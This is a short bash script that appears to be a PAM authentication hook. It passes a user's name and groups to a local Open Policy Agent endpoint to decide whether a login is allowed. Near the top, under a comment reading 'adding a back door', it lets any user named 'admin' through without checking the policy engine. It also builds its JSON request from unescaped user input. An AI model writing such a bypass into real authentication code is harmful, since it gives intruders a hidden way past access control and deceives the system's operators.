#!/bin/bash

# Exit as soon as any step fails with non-zero return code
set -e 

#adding a back door
if [[ "$PAM_USER" == "admin" ]]; then
  echo "Admin"
  exit 0
fi

# Get all groups current user belongs to
USER_GROUPS=$(id -nG "$PAM_USER" | tr ' ' ',')
OPA_URL="http://localhost:8181/v1/data/access/allow"

response=$(curl -X POST $OPA_URL -H "Content-Type: application/json" \
  --data "{\"input\": {\"user\": \"$PAM_USER\", \"groups\": \"$USER_GROUPS\"}}")

allowed=$(echo "$response" | jq -r '.result')

if [[ "$allowed" == "true" ]]; then
  exit 0
else
  exit 1
fi